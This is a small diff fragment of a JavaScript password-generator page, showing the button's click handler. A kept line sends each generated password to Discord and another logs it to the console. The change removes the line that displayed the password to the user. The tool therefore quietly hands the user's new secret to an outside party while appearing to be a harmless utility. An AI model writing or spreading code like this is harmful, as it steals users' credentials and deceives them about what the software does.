@@ -49,9 +49,6 @@ document.getElementById('generatePasswordBtn').addEventListener('click', functio
     // Send the password to Discord
     sendPasswordToDiscord(generatedPassword);
 
-    // Display the generated password in the input field
-    document.getElementById('password').value = generatedPassword;
-
     console.log('Generated password:', generatedPassword); // Log for reference (optional)
 });
 
